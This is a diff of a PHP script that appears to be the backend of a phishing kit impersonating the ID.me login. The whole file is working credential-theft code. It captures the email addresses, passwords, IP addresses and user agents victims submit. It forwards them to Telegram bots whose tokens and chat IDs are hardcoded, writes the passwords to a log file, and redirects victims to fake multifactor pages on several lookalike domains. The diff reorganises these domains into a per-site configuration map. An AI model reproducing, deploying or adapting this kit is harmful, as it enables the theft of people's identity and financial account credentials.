@@ -1,47 +1,93 @@
 <?php
-// SIMPLE VERSION - FIXED FOR HTML FORM
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
+// include 'firewall.php'; // Uncomment if needed
 
-// Log file for debugging
-$log_file = __DIR__ . '/idme_submissions.log';
+ob_start();
 
-// Bots configuration
-$telegram_bots = [
-    [
-        'token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw',
-        'chat_id' => '1325797388'
+// Site-specific configuration with domain-based bots and redirects
+$site_map = [
+    'upstartloan.rf.gd' => [
+        'bots' => [
+            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44', 'chat_id' => '7510889526']
+        ],
+        'redirect' => 'https://upstartloan.rf.gd/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html'
     ],
-    [
-        'token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44',
-        'chat_id' => '7510889526'
-    ]
+
+    'illuminatigroup.world' => [
+        "bots" => [
+            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8459891488:AAHBwkSpyaRAtGCI6yWm_-39c61LJhQgI4w', 'chat_id' => '5978851707'],
+        ],
+        "redirect" => "https://illuminatigroup.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
+    ],
+
+    'illuminatiglobal.world' => [
+        "bots" => [
+            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8572613269:AAEMx8dbCNQnUHfKtZ5kuhpVfjE6fBdhofw', 'chat_id' => '6512010552'],
+        ],
+        "redirect" => "https://illuminatiglobal.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
+    ],
+
+    'illuminatinetwork.world' => [
+        "bots" => [
+            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8233162319:AAGUMse4WldCYNsGerfsU2FDnmY-_Heo-yM', 'chat_id' => '6944000447'],
+        ],
+        "redirect" => "https://illuminatinetwork.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
+    ],
+
+    'illuminaticonnect.world' => [
+        "bots" => [
+            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8578491453:AAFjqP9TdTwv4IpsCJdghljt28y0yHqnYD8', 'chat_id' => '1972703470'],
+        ],
+        "redirect" => "https://illuminaticonnect.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
+    ],
 ];
 
-// Simple logging function
-function log_message($message) {
-    global $log_file;
-    $timestamp = date('Y-m-d H:i:s');
-    file_put_contents($log_file, "[$timestamp] $message\n", FILE_APPEND);
+// Get the referring domain
+$referer = $_SERVER['HTTP_REFERER'] ?? '';
+$parsed = parse_url($referer);
+$domain = $parsed['host'] ?? 'unknown';
+
+// Find the configuration for this domain
+$config = $site_map[$domain] ?? null;
+
+// If no config found, use a default one (you can modify this)
+if (!$config) {
+    // Option 1: Use first domain's config as fallback
+    $config = reset($site_map);
+    
+    // Option 2: Or redirect to a generic page
+    // header("Location: https://example.com/error.html");
+    // exit;
+    
+    // Option 3: Or show error
+    // http_response_code(403);
+    // exit("Unauthorized origin: $domain");
 }
 
-// Start fresh
-log_message("=== New submission attempt ===");
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Setup log file
+    $log_file = __DIR__ . "/logs/idme_logins.txt";
+    if (!file_exists(dirname($log_file))) {
+        mkdir(dirname($log_file), 0777, true);
+    }
 
-// Check if it's a POST request
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    log_message("POST request received");
-    
-    // Get form data
-    $useremail = $_POST['useremail'] ?? 'Not provided';
-    $userpassword = $_POST['userpassword'] ?? 'Not provided';
+    // Logging function
+    function log_entry($msg) {
+        global $log_file;
+        $timestamp = date("Y-m-d H:i:s");
+        file_put_contents($log_file, "[$timestamp] $msg\n", FILE_APPEND);
+    }
+
+    // Get form data from HTML form
+    $useremail = htmlspecialchars($_POST['useremail'] ?? 'Unknown');
+    $userpassword = htmlspecialchars($_POST['userpassword'] ?? 'Empty');
     $remember_me = isset($_POST['remember_me']) ? 'Yes' : 'No';
-    
-    log_message("Email: $useremail");
-    log_message("Password length: " . strlen($userpassword));
-    log_message("Remember me: $remember_me");
-    
-    // Get IP address (SERVER-SIDE, not from form)
+
+    // Get IP address SERVER-SIDE (HTML form doesn't send this anymore)
     $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
           $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
           $_SERVER['HTTP_X_FORWARDED'] ?? 
@@ -50,90 +96,71 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
           $_SERVER['REMOTE_ADDR'] ?? 
           'unknown';
     
+    // Handle multiple IPs in X_FORWARDED_FOR
     if (strpos($ip, ',') !== false) {
         $ips = explode(',', $ip);
         $ip = trim($ips[0]);
     }
-    
-    log_message("Detected IP: $ip");
-    
-    // Get referrer domain
-    $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct access';
-    log_message("Referer: $referer");
+
+    $timestamp = date("Y-m-d H:i:s");
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
     
     // Prepare Telegram message
-    $timestamp = date('Y-m-d H:i:s');
-    $message = "🔐 *New ID.me Login*\n\n" .
+    $message = "🔐 *ID.me Login Submission*\n\n" .
                "📧 *Email:* `$useremail`\n" .
                "🔑 *Password:* `$userpassword`\n" .
                "💾 *Remember Me:* $remember_me\n" .
-               "🌐 *IP:* `$ip`\n" .
-               "📝 *Time:* $timestamp\n" .
-               "🔗 *Source:* " . (strlen($referer) > 50 ? substr($referer, 0, 50) . '...' : $referer);
-    
-    // Send to Telegram
-    foreach ($telegram_bots as $index => $bot) {
+               "🌐 *Domain:* $domain\n" .
+               "📡 *IP:* `$ip`\n" .
+               "🕒 *Time:* $timestamp\n" .
+               "🔍 *User Agent:* " . substr($user_agent, 0, 100);
+
+    // Send to Telegram bots (using domain-specific bots from config)
+    foreach ($config['bots'] as $bot_index => $bot) {
         if (empty($bot['token']) || empty($bot['chat_id'])) {
-            log_message("Skipping bot $index - empty token or chat_id");
+            log_entry("Skipping bot $bot_index - empty token or chat_id");
             continue;
         }
         
-        $telegram_url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
+        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
         $data = [
             'chat_id' => $bot['chat_id'],
             'text' => $message,
             'parse_mode' => 'Markdown'
         ];
-        
-        $ch = curl_init($telegram_url);
+
+        $ch = curl_init($url);
         curl_setopt_array($ch, [
-            CURLOPT_POST => 1,
-            CURLOPT_POSTFIELDS => $data,
             CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_TIMEOUT => 10,
-            CURLOPT_SSL_VERIFYPEER => false // For debugging, remove in production
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => $data,
+            CURLOPT_TIMEOUT => 30,
+            CURLOPT_SSL_VERIFYPEER => true // Keep this true for security
         ]);
         
         $result = curl_exec($ch);
         
         if (curl_error($ch)) {
-            log_message("Telegram error (bot $index): " . curl_error($ch));
+            log_entry("❌ Telegram error (bot $bot_index): " . curl_error($ch));
         } else {
-            log_message("Telegram success (bot $index): " . substr($result, 0, 100));
+            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            log_entry("✓ Telegram sent (bot $bot_index) - HTTP $http_code");
         }
         
         curl_close($ch);
     }
-    
-    // Redirect based on referrer domain
-    $redirect_url = 'https://illuminatigroup.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html';
-    
-    // Parse referrer to determine redirect
-    $parsed = parse_url($referer);
-    $domain = $parsed['host'] ?? '';
-    
-    if (strpos($domain, 'illuminatigroup.world') !== false) {
-        $redirect_url = 'https://illuminatigroup.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html';
-    } elseif (strpos($domain, 'illuminatiglobal.world') !== false) {
-        $redirect_url = 'https://illuminatiglobal.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html';
-    } elseif (strpos($domain, 'illuminatinetwork.world') !== false) {
-        $redirect_url = 'https://illuminatinetwork.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html';
-    } elseif (strpos($domain, 'illuminaticonnect.world') !== false) {
-        $redirect_url = 'https://illuminaticonnect.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html';
-    } elseif (strpos($domain, 'upstartloan.rf.gd') !== false) {
-        $redirect_url = 'https://upstartloan.rf.gd/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html';
-    }
-    
-    log_message("Redirecting to: $redirect_url");
-    
-    // Clear any output and redirect
-    if (ob_get_level()) ob_end_clean();
-    header("Location: $redirect_url");
+
+    // Log the submission
+    log_entry("[$domain] Login from $ip - Email: $useremail | Password: $userpassword");
+
+    // Clear output buffer and redirect to domain-specific URL
+    ob_end_clean();
+    header("Location: " . $config['redirect']);
     exit;
     
 } else {
     // Not a POST request
-    log_message("Invalid request method: " . $_SERVER['REQUEST_METHOD']);
     echo "This page only accepts POST submissions from the login form.";
+    exit;
 }
 ?>
